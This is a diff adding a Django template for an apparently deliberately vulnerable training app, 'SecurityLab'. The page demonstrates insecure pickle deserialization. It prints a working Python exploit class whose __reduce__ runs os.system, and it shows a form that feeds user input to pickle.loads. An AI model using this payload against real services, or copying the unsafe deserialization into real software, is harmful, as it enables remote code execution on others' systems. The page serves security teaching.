@@ -1,0 +1,35 @@
+{% extends "base.html" %}
+{% block title %}Deserialize (Pickle RCE) – SecurityLab{% endblock %}
+{% block content %}
+<div class="card">
+  <h1>☣️ Deserialization – Pickle RCE Demo</h1>
+
+  <div class="vuln-box">
+    <strong>[V-27] Insecure Deserialization (Remote Code Execution)</strong><br>
+    The server calls <code>pickle.loads(base64.b64decode(data))</code> on your input.<br><br>
+    <strong>Step 1 – Generate a malicious payload (run locally):</strong>
+    <pre style="margin-top:8px">import pickle, os, base64
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('id > /tmp/pwned.txt',))
+
+payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+print(payload)</pre>
+    <strong>Step 2 – Paste the output below and submit.</strong><br>
+    Check <code>/tmp/pwned.txt</code> on the server to confirm RCE.
+  </div>
+
+  <form method="post">
+    {% csrf_token %}
+    <label>Base64-encoded pickle payload</label>
+    <textarea name="data" placeholder="gASV..."></textarea>
+    <button type="submit">Deserialize</button>
+  </form>
+
+  {% if output %}
+    <label style="margin-top:16px">Result</label>
+    <pre>{{ output }}</pre>
+  {% endif %}
+</div>
+{% endblock %}
